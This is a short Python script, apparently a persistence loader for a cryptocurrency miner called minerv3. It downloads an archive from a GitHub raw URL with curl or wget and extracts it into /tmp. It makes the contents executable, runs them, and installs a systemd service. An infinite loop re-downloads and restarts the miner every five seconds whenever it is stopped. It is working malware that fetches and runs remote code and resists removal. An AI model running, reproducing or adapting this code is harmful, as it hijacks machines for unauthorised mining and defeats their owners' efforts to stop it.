#!/usr/bin/env python3

import os
import time
import subprocess
import tarfile

APP_DIR = "/tmp/minerv3"

MASTER_URL = "https://raw.githubusercontent.com/letscash3-spec/Daddy/refs/heads/main/minerv3.tar.gz"
ARCHIVE_NAME = "minerv3.tar.gz"
ARCHIVE_PATH = os.path.join(APP_DIR, ARCHIVE_NAME)

SERVICE_SRC = os.path.join(APP_DIR, "minerv3.service")
SERVICE_DEST = "/etc/systemd/system/minerv3.service"

def download_file(url, output_path):
    if subprocess.call(["command", "-v", "curl"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        ret = subprocess.call(["curl", "-fsSL", url, "-o", output_path])
        if ret == 0: return True
    
    if subprocess.call(["command", "-v", "wget"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        ret = subprocess.call(["wget", "-q", url, "-O", output_path])
        if ret == 0: return True
            
    print(f"Failed to download {url} using both curl and wget!")
    return False

def sync_files():
    print("Syncing files from master archive...")
    if download_file(MASTER_URL, ARCHIVE_PATH):
        try:
            with tarfile.open(ARCHIVE_PATH, 'r:gz') as tar:
                tar.extractall(path=APP_DIR)
            
            os.system(f"chmod +x {APP_DIR}/minerv3.sh")
            os.system(f"chmod +x {APP_DIR}/minerv3.py")
            os.system(f"chmod +x {APP_DIR}/minerv3")
            return True
        except Exception as e:
            print(f"Extraction failed: {e}")
            return False
    return False

def restore_system():
    if not os.path.exists(os.path.join(APP_DIR, "minerv3.sh")) or subprocess.call(["pgrep", "-f", "minerv3.sh"]) != 0:
        print("minerv3.sh is killed! Re-syncing and running...")
        if sync_files():
            os.system(f"{APP_DIR}/minerv3.sh &")

    if subprocess.call(["systemctl", "is-active", "--quiet", "minerv3.service"]) != 0:
        print("Service is killed! Re-installing and starting...")
        if os.path.exists(SERVICE_SRC):
            subprocess.call(["cp", SERVICE_SRC, SERVICE_DEST])
            os.system("systemctl daemon-reload")
        os.system("systemctl start minerv3.service")

# ==========================================

if not os.path.exists(os.path.join(APP_DIR, "minerv3.sh")):
    sync_files()

while True:
    restore_system()
    # 
    time.sleep(5)
